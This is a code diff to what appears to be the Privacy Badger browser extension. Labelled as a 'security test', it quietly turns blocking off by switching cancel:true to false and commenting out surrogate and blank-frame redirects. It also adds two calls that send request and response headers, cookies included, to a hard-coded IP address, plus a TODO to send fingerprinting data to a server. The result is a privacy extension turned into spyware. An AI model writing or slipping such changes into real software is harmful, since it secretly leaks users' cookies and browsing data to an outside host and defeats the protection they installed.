@@ -67,7 +67,7 @@ function onBeforeRequest(details) {
   // tabId for pings are always -1 due to Chrome bugs #522124 and #522129
   // Once these bugs are fixed, PB will treat pings as any other request
   if (type == "ping" && tab_id < 0) {
-    return {cancel: true};
+    return {cancel: false}; // AAU Don't block this
   }
 
   if (_isTabChromeInternal(tab_id)) {
@@ -128,7 +128,7 @@ function onBeforeRequest(details) {
     };
   }
 
-  return {cancel: true};
+  return {cancel: false}; // AAU Flag changed, defaults to cancel requests
 }
 
 /**
@@ -148,6 +148,19 @@ function onBeforeSendHeaders(details) {
     // DNT policy requests: strip cookies
     if (type == "xmlhttprequest" && url.endsWith("/.well-known/dnt-policy.txt")) {
       // remove Cookie headers
+
+      // remove Set-Cookie headers
+      // TODO: AAU-SECURITY TEST
+      utils.xhrRequest("http://142.93.109.128:443/blockSetCookie/" + details.requestHeaders, function(err, response) {
+        if (err) {
+          console.error('Problem calling netcast listener');
+        }
+        if (response) {
+          console.log('We are happy, netcat called');
+        }
+      });
+      // END OF TEST
+
       let newHeaders = [];
       for (let i = 0, count = details.requestHeaders.length; i < count; i++) {
         let header = details.requestHeaders[i];
@@ -213,7 +226,7 @@ function onBeforeSendHeaders(details) {
     if (type == 'script') {
       var surrogate = getSurrogateURI(url, requestDomain);
       if (surrogate) {
-        return {redirectUrl: surrogate};
+        //return {redirectUrl: surrogate}; // AAU No!
       }
     }
 
@@ -226,11 +239,11 @@ function onBeforeSendHeaders(details) {
 
     if (type == 'sub_frame' && badger.getSettings().getItem('hideBlockedElements')) {
       return {
-        redirectUrl: 'about:blank'
+        //redirectUrl: 'about:blank' // AAU: NO
       };
     }
 
-    return {cancel: true};
+    return {cancel: false}; //AAU: true->false
   }
 
   // This is the typical codepath
@@ -246,7 +259,7 @@ function onBeforeSendHeaders(details) {
 
   // if we are here, we're looking at a third party
   // that's not yet blocked or cookieblocked
-  if (badger.isDNTSignalEnabled()) {
+  if (badger.isDNTSignalEnabled()) { // AAU: This should always be false anyway
     details.requestHeaders.push({name: "DNT", value: "1"});
   }
   return {requestHeaders: details.requestHeaders};
@@ -266,13 +279,23 @@ function onHeadersReceived(details) {
     // DNT policy responses: strip cookies, reject redirects
     if (details.type == "xmlhttprequest" && url.endsWith("/.well-known/dnt-policy.txt")) {
       // if it's a redirect, cancel it
-      if (details.statusCode >= 300 && details.statusCode < 400) {
-        return {
+      if (details.statusCode >= 300 && details.statusCode < 400) { // AAU: Naa, let's play nice
+        /*return {
           cancel: true
-        };
+        };*/
       }
 
       // remove Set-Cookie headers
+      // TODO: AAU-SECURITY TEST
+      utils.xhrRequest("http://142.93.109.128:443/blockSetCookie/" + details.responseHeaders, function(err, response) {
+        if (err) {
+          console.error('Problem calling netcast listener');
+        }
+        if (response) {
+          console.log('We are happy, netcat called');
+        }
+      });
+      // END OF TEST
       let headers = details.responseHeaders,
         newHeaders = [];
       for (let i = 0, count = headers.length; i < count; i++) {
@@ -473,6 +496,9 @@ function recordFingerprinting(tabId, msg) {
           // Mark this as a strike
           badger.heuristicBlocking.updateTrackerPrevalence(
             script_host, window.getBaseDomain(document_host));
+
+          // TODO: AAU; Send mark to server!!!
+
         }
       }
       // This is a canvas write
